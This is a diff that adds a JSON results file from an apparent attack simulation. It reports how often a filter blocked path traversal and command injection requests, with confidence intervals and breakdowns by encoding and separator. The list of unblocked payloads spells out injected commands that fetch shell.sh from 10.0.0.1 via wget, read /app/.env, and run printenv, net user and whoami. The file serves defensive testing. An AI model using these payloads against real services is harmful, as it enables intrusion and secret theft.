@@ -1,0 +1,293 @@
+{
+  "inputs": {
+    "corpus": {
+      "path": "attack-sim/large_corpus_requests.json",
+      "sha256": "68af7d2b071393c594f9a7587d925adad6dd9430e52b651122f2368cf5aaa3f5"
+    },
+    "results": {
+      "path": "attack-sim/results_config2-published-0.1.1-harness-fixed-20261010.json",
+      "sha256": "66958151c52888a9c629ff440fdc0759a244ba25fb4ba5cb89916fd6b4f03490"
+    }
+  },
+  "path_traversal": {
+    "n": 200,
+    "blocked": 200,
+    "pct_blocked": 100.0,
+    "wilson_95_pct": [
+      98.12,
+      100.0
+    ],
+    "errors": [],
+    "by_encoding": {
+      "null_byte": {
+        "n": 29,
+        "blocked": 29,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          88.3,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "double_encoding": {
+        "n": 23,
+        "blocked": 23,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          85.69,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "overlong_utf8": {
+        "n": 19,
+        "blocked": 19,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          83.18,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "dot_slash_duplication": {
+        "n": 21,
+        "blocked": 21,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          84.54,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "backslash": {
+        "n": 25,
+        "blocked": 25,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          86.68,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "absolute": {
+        "n": 15,
+        "blocked": 15,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          79.61,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "encoded_dotdot_slash_or_mixed": {
+        "n": 43,
+        "blocked": 43,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          91.8,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "raw_dotdot_slash": {
+        "n": 25,
+        "blocked": 25,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          86.68,
+          100.0
+        ],
+        "not_blocked": []
+      }
+    },
+    "unclassified": []
+  },
+  "cmdi": {
+    "n": 199,
+    "blocked": 185,
+    "pct_blocked": 92.96,
+    "wilson_95_pct": [
+      88.54,
+      95.76
+    ],
+    "errors": [
+      {
+        "id": "cmdi_7",
+        "payload": "127.0.0.1%26wget http://10.0.0.1/shell.sh -O /tmp/s.sh //",
+        "error": "timed out"
+      }
+    ],
+    "by_system": {
+      "windows": {
+        "n": 34,
+        "blocked": 30,
+        "pct_blocked": 88.24,
+        "wilson_95_pct": [
+          73.38,
+          95.33
+        ]
+      },
+      "posix": {
+        "n": 165,
+        "blocked": 155,
+        "pct_blocked": 93.94,
+        "wilson_95_pct": [
+          89.2,
+          96.68
+        ]
+      }
+    },
+    "by_separator": {
+      "||": {
+        "n": 12,
+        "blocked": 12,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          75.75,
+          100.0
+        ]
+      },
+      "&&": {
+        "n": 32,
+        "blocked": 31,
+        "pct_blocked": 96.88,
+        "wilson_95_pct": [
+          84.26,
+          99.45
+        ]
+      },
+      "|": {
+        "n": 45,
+        "blocked": 41,
+        "pct_blocked": 91.11,
+        "wilson_95_pct": [
+          79.27,
+          96.49
+        ]
+      },
+      "&": {
+        "n": 24,
+        "blocked": 21,
+        "pct_blocked": 87.5,
+        "wilson_95_pct": [
+          69.0,
+          95.66
+        ]
+      },
+      ";": {
+        "n": 47,
+        "blocked": 43,
+        "pct_blocked": 91.49,
+        "wilson_95_pct": [
+          80.07,
+          96.64
+        ]
+      },
+      "newline (\\n / %0a)": {
+        "n": 31,
+        "blocked": 29,
+        "pct_blocked": 93.55,
+        "wilson_95_pct": [
+          79.28,
+          98.21
+        ]
+      },
+      "backticks": {
+        "n": 2,
+        "blocked": 2,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          34.24,
+          100.0
+        ]
+      },
+      "$()": {
+        "n": 6,
+        "blocked": 6,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          60.97,
+          100.0
+        ]
+      },
+      "no_separator": {
+        "n": 0,
+        "blocked": 0,
+        "pct_blocked": null,
+        "wilson_95_pct": null
+      }
+    },
+    "not_blocked": [
+      {
+        "id": "cmdi_6",
+        "payload": "127.0.0.1\nnet user",
+        "status": 200
+      },
+      {
+        "id": "cmdi_9",
+        "payload": "127.0.0.1%26printenv",
+        "status": 200
+      },
+      {
+        "id": "cmdi_28",
+        "payload": "127.0.0.1%0ahostname %23",
+        "status": 200
+      },
+      {
+        "id": "cmdi_31",
+        "payload": "127.0.0.1|net user",
+        "status": 200
+      },
+      {
+        "id": "cmdi_36",
+        "payload": "127.0.0.1;;wget http://10.0.0.1/shell.sh -O /tmp/s.sh #",
+        "status": 200
+      },
+      {
+        "id": "cmdi_38",
+        "payload": "127.0.0.1|&sleep 10 %23",
+        "status": 200
+      },
+      {
+        "id": "cmdi_40",
+        "payload": "127.0.0.1%7cprintenv",
+        "status": 200
+      },
+      {
+        "id": "cmdi_66",
+        "payload": "127.0.0.1;;wget http://10.0.0.1/shell.sh -O /tmp/s.sh %23",
+        "status": 200
+      },
+      {
+        "id": "cmdi_112",
+        "payload": "127.0.0.1%26net user",
+        "status": 200
+      },
+      {
+        "id": "cmdi_120",
+        "payload": "127.0.0.1%7cwhoami",
+        "status": 200
+      },
+      {
+        "id": "cmdi_134",
+        "payload": "127.0.0.1&&cat /app/.env",
+        "status": 200
+      },
+      {
+        "id": "cmdi_155",
+        "payload": "127.0.0.1%3B%3Bwget%20http%3A%2F%2F10.0.0.1%2Fshell.sh%20-O%20%2Ftmp%2Fs.sh%20%23",
+        "status": 200
+      },
+      {
+        "id": "cmdi_184",
+        "payload": "127.0.0.1;net user",
+        "status": 200
+      },
+      {
+        "id": "cmdi_185",
+        "payload": "127.0.0.1%26cat /app/.env %23",
+        "status": 200
+      }
+    ]
+  }
+}
